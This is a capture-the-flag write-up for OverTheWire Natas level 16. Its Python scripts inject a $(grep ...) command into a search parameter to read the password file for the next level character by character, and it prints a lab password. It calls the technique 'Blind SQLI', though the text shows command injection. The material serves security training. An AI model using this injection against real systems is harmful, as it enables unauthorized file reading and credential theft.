# Level 16 -> 17  

Blind SQLI  

we use the text response of whether the user exists or not to figure out the password for level 17  

use this script to find charset of the password (i.e. set of characters which make up the password)  

```python
import requests
from requests.auth import HTTPBasicAuth

auth = HTTPBasicAuth("natas16", "hPkjKYviLQctEW33QmuXL6eDVfMW4sGo")

charset = ""
allchars = "abcdefghijklmnopqrstuvwxyz" + "ABCDEFGHIJKLMNOPQRSTUVWXYZ" + "0123456789"

for char in allchars:
	r = requests.get(f"http://natas16.natas.labs.overthewire.org/?needle=doomed$(grep {char} /etc/natas_webpass/natas17)", auth=auth)
	if "doomed" not in r.text:
		charset += char
		print(charset.ljust(len(allchars), "*"))
```

this works because of this query  

```
doomed$(grep a /etc/natas_webpass/natas17)
```

Checks if "**a**" is in the file **/etc/natas_webpass/natas17**  

Find password using bruteforce of charset characters using the script below  

```python
import requests
from requests.auth import HTTPBasicAuth

auth = HTTPBasicAuth("natas16", "hPkjKYviLQctEW33QmuXL6eDVfMW4sGo")

charset = "bhjkoqsvwCEFHJLNOT05789"
password = ""

for i in range(0, 32):
	for char in charset:
		r = requests.get(f"http://natas16.natas.labs.overthewire.org/?needle=doomed$(grep ^{password + char} /etc/natas_webpass/natas17)", auth=auth)
		if "doomed" not in r.text:
			password += char
			print(password.ljust(32, "*"))
			break
```

